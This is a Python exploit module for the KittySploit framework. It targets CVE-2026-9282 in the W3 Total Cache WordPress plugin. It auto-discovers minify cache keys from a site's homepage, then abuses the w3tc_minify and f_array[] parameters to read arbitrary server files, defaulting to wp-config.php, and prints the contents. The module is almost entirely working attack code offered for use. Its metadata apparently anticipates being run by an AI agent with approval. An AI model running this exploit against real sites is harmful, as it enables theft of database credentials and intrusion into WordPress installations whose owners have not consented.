#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""W3 Total Cache CVE-2026-9282 — minify f_array[] arbitrary file read."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_MINIFY_RE = re.compile(
    r"/wp-content/cache/minify/([a-f0-9]+)\.([^./\"]+)\.include(?:-(?:footer|body))?\.[a-f0-9]+\.(?:css|js)"
)


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "W3 Total Cache CVE-2026-9282 file read",
        "description": "Reads local files via w3tc_minify + f_array[] when manual minify is enabled.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-9282"],
        "tags": ["wordpress", "w3-total-cache", "lfi", "cve-2026-9282"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    theme_key = OptString("", "Minify theme hash (auto from homepage if empty)", required=False)
    template_key = OptString("", "Minify template segment (auto if empty)", required=False)
    target_file = OptString("wp-config.php", "Relative file under WP root", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _keys(self):
        theme = (self.theme_key or "").strip()
        tmpl = (self.template_key or "").strip()
        if theme and tmpl:
            return theme, tmpl
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        m = _MINIFY_RE.search(home.text or "") if home else None
        if m:
            return m.group(1), m.group(2)
        return "", ""

    def run(self):
        theme, tmpl = self._keys()
        if not theme or not tmpl:
            print_error("Could not determine minify keys — set theme_key and template_key")
            return False
        rel = (self.target_file or "wp-config.php").strip().lstrip("/")
        resp = self.http_request(
            method="GET",
            path=self._join("/"),
            params={
                "w3tc_minify": f"{theme}.{tmpl}.include.{theme}.css",
                "f_array[]": rel,
            },
            allow_redirects=False,
        )
        body = resp.text or "" if resp else ""
        if resp and int(resp.status_code or 0) == 200 and body:
            print_success(f"Minify read for {rel}")
            print_status(body[:900])
            return True
        print_error("Read failed — confirm manual minify mode")
        return False
